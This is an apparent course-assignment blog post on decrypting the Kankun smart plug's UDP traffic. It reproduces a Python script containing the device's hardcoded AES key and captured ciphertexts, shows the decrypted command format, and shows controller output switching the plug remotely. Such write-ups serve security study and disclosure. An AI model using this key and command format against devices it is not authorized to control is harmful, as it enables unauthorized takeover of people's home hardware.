---
layout: post
title: "Kankun Smart Plug Network Decryption"
description: "In the first blog post about the Kankun smartplug, the Android application was decompiled and the AES-256 bit encryption key was found. In this blog post, the network traffic between the mobile app and smartphone will be captured, the network traffic will be decrypted utilizing a script from Payatu and the encryption key found previously, and the Kankun Smartplug will be controlled via the Kankun Controller Script from 0x00string"
tags: [analysis, kankun, decryption]
---

This blog post has been created for completing the requirements of the
SecurityTube Offensive Internet of Things course.

[Offensive Internet Of Things Exploitation](http://www.securitytube-training.com/online-courses/offensive-internet-of-things-exploitation/index.html)

Student ID: IoTE- 778

## Overview

In the first blog post about the Kankun smartplug, the Android application
was decompiled and the AES-256 bit encryption key was found. In this
blog post:

- The network traffic between the mobile app and smartphone will be captured
- The network traffic will be decrypted utilizing a script from Payatu
  and the encryption key found previously
- The Kankun Smartplug will be controlled via the
  [Kankun Controller Script](https://github.com/0x00string/kankuncontroller)

## Network Traffic Capture and Decryption

The setup that is necessary involves:

- Installing the Kankun iphone app on an iphone
- Plugging in the Kankun Smartplug and setting up the iphone app to talk with it
- Connecting to the Wi-Fi SSID from a machine running Wireshark
- Setting Wireshark up to monitor the network traffic

![Kankun Smart Plug Iphone App](/assets/Kankun/iphoneapp.png)
![Kankun Smart Plug](/assets/Kankun/smartplug.jpg)
![Kankun Plugged In](/assets/Kankun/pluggedin.jpg)

I'll leave installing the iphone app to the manual that comes with the
plug. I'll also leave monitoring network traffic with Wireshark to the
many great blog posts out there on the subject.

With Wireshark monitoring the network traffic, various activities can
be performed from the iphone application to the Kankun smartplug and
the packets captured.

![Kankun Wireshark Capture](/assets/Kankun/KankunWiresharkCapture.png)

Once traffic has been captured within Wireshark the UDP
packets can be copied as a hexstream and decrypted. In this blog post
I will utilize a script by "Payatu" to perform the decryption. There
is something that is not really covered specifically within the
Offensive IoT Exploitation course and is important to the success of
the decryption.

When UDP packets are copied as a hexstream from Wireshark, the
hexstream will include the whole UDP packet. As seen on the
[User Datagram Protocol Wiki Page](https://en.wikipedia.org/wiki/User_Datagram_Protocol#Packet_structure),
there is more to a UDP packet than just the data being sent to the
device. Source and destination ip addresses, packet size, checksum,
etc. are all part of the packet as well as the data. Within Wireshark,
when different sections of bytes are hovered over within a packet, the
status bar at the bottom of the screen will indicate the various
pieces of the packet. Moving toward the later bytes in the packet
reveals the "data" section. This is the section we are interested in
decrypting. This means that when the bytes are copied as a hexstream,
that the bytes will need to be trimmed down to only include the
data. This was confusing at first as I had forgotten about the
structure of a UDP packet and I didn't anticipate Wireshark copying
the whole packet as a hexstream.

![UDP Packet Data](/assets/Kankun/UDPPacketData.png)

### Decryption with Payatu's kcrypt.py

As part of the Offensive IoT Exploitation course, the instructor
demo's and provides a copy of a python script `kcrypt.py`. This script
is fairly straightforward in that it takes a series of encrypted
strings and an AES key and then proceeds to decrypt and print out each
of the decrypted strings. The script is reproduced below with the
various strings that were captured from the UDP packets:


{% highlight python %}

#!/usr/bin/python
#
#
# kcrypt.py - Kankun communication encrypt/decrypt
#
# 1. Copy  the encrypted application layer data as hex stream from PCAP
#     - In Wireshark Click on the Data in middle window which shows the TCP/IP stack
#       details and then right click -> Copy -> Bytes -> Hex Stream
# 2. Use it in this script i.e put it in the str variable 
#    - Use a 3 more consecutive UDP packet data and decrypt them as well  
# 3. Put the AES key in the key variable below
# 4. Run the script to decrypt it
# 3. Create a kankun ON command
#     - Encrypt and print it
#     - Decrypt the encrypted string above and print it
#
# Copyright 2015 (c) Payatu
# Author(s): Aseem Jakhar   aseem[at]payatu[dot]com
#
# Websites: www.payatu.com  www.nullcon.net  www.hardwear.io www.null.co.in
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
# BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
# PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
# OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#

import sys
import os, re, socket, time, select, random, getopt
from Crypto.Cipher import AES


# AES KEY
key = "fdsl;mewrjope456fds4fbvfnjwaugfo"

str1="d172da47c0c27113783b1dfe0074863e88880d735211653e3d179dcba6a773bd4e61645c1f0816b434e363a8509b996d979f89599e81266cfa9f0c680abab0f4".decode('hex')
str2="c42cb8276aeb4ef501943c31c207fb1cad86623edc278a2ba7dd508beeda771e620e5f50a9ef5cef74a3c5e248fb1f121d3cfb74266618f8673535d5fc45f986".decode('hex')
str3="d172da47c0c27113783b1dfe0074863e88880d735211653e3d179dcba6a773bd8212baafdc9ab7c7e5a7b4b0dece1544ae6df90c0a41e17ffe5a0a631b198e4f".decode('hex')
str4="c42cb8276aeb4ef501943c31c207fb1cad86623edc278a2ba7dd508beeda771e013248a804af368fbbe5b2c684c88b4d6eda4dddf9c8aa94fb37311c1ee35c62".decode('hex')
str5="d172da47c0c27113783b1dfe0074863e88880d735211653e3d179dcba6a773bd9ca1c318facd81e8ca6aa1f3b3bcf07867c426baf6c74819cd4e5653f76d92ef".decode('hex')
str6="c42cb8276aeb4ef501943c31c207fb1cad86623edc278a2ba7dd508beeda771e620e5f50a9ef5cef74a3c5e248fb1f12372b89633779b07adce6768b30588e95".decode('hex')

# Encrypt or decrypt the passed string
def cipher(type, str):
    # AES requires the input length to be in multiples of 16
    aesobj = AES.new(key, AES.MODE_ECB)
    if str is not None:
        while (len(str) % 16 is not 0):
            str = str + " "
        if type == "enc":
            return aesobj.encrypt(str)
        elif type == "dec":
            return aesobj.decrypt(str)
    else:
        return None



# Create the command string
# cmd => the command type
# cid => confirmation id for command type == confirm 
def createmsg(cmd,cid=None):
        sp = "%"
        msg = "lan_phone" + sp + rmac + sp + password + sp
        if cmd == "open":
                msg = msg + "open" + sp + "request"
        elif cmd == "close":
                msg = msg + "close" + sp + "request"
        elif cmd == "confirm":
            msg = msg + "confirm#"+ cid + sp + "request"
        return msg

## Get the confirmation ID
def get_confirmid(m):
    p = re.search(r"confirm#(\w+)", m)          # to printout the confirmation number only!!
    if p is not None:
        return p.group(1)
    else:
        return None

class Fonts:
    BOLD = '\033[1m'
    END = '\033[0m'

def main():
    print ""
    print Fonts.BOLD + "[+] kankun crypt script" + Fonts.END
    print ""
    cmd = None

    dec = cipher("dec", str1)
    print "Decrypted str1: (" + dec + ")"

    dec = cipher("dec", str2)
    print "Decrypted str2: (" + dec + ")"

    dec = cipher("dec", str3)
    print "Decrypted str3: (" + dec + ")"

    dec = cipher("dec", str4)
    print "Decrypted str4: (" + dec + ")"

    dec = cipher("dec", str5)
    print "Decrypted str5: (" + dec + ")"

    dec = cipher("dec", str6)
    print "Decrypted str6: (" + dec + ")"

if __name__ == "__main__":
    main()

{% endhighlight %}

After running this script using the AES key found in the Android
apps `.so` and the data that was captured from listening to the
traffic between the app and the device, the following results are
found:

{% highlight bash %}
$ python kcrypt.py

[+] kankun crypt script

Decrypted str1: (lan_phone%00:15:61:db:53:61%nopassword%open%request)
Decrypted str2: (lan_device%00:15:61:db:53:61%nopassword%confirm#98293%rack)
Decrypted str3: (lan_phone%00:15:61:db:53:61%nopassword%confirm#98293%request)
Decrypted str4: (lan_device%00:15:61:db:53:61%nopassword%open%rack)
Decrypted str5: (lan_phone%00:15:61:db:53:61%nopassword%close%request)
Decrypted str6: (lan_device%00:15:61:db:53:61%nopassword%confirm#38787%rack)
{% endhighlight %}

After decrypting the data it is apparent as to the structure of the
commands that are sent to the device. Utilizing this information a
script could be created to mimic the functionality of the mobile app
and manipulate the device from a computer. In fact, that is just what
"0x00string" did with the Kankun controller script located
[here](https://github.com/0x00string/kankuncontroller). Configuring
the script with the proper ip and mac address of the device allows for
manipulation of the device just as though you were using the mobile
app:

{% highlight python %}
def applyConfig():
    ##
    # you can change these to your liking
    ##
    global IFACE
    IFACE = "wlan0"
    global RHOST
    RHOST = "IP of Kankun device goes here"
    global RMAC
    RMAC = "MAC address of Kankun device goes here"
    global PASSWORD
    PASSWORD = "nopassword"
    global NAME
    NAME = "lan_phone"
    global VERBOSE
    VERBOSE = False
    global SSID
    SSID = "SSID of the Kankun Wi-Fi goes here"
    global WLANKEY
	# No key is used by default
    #WLANKEY = "pineapplekey"
    WLANKEY = ""
    global INITPASS
    INITPASS = "nopassword"
    global DEVNAME
    DEVNAME = "name"

{% endhighlight %}

{% highlight bash %}

$:~/kankuncontroller# python kkeps_controller.py -a heart
In apply config....
[*]	Sending heart packet...
[+]	received reply packet...
[*]	Heartbeat ackowledged
$:~/kankuncontroller# python kkeps_controller.py -a on
In apply config....
[*]	Sending open packet...
[+]	received reply packet...
[*]	confirmation number: 96448
[*]	sending confirmation #: 96448
[!]	Nothing returned...
$:~/kankuncontroller# python kkeps_controller.py -a off
In apply config....
[*]	Sending close packet...
[+]	received reply packet...
[*]	confirmation number: 80530
[*]	sending confirmation #: 80530
[*]	received reply packet...
[*]	switch is: close

{% endhighlight %}

Awesome! We can now control the device from a computer.

This particular exercise was quite fun. It was really exciting to see
the analysis of a device lead to the ability to remotely control it
from a computer.
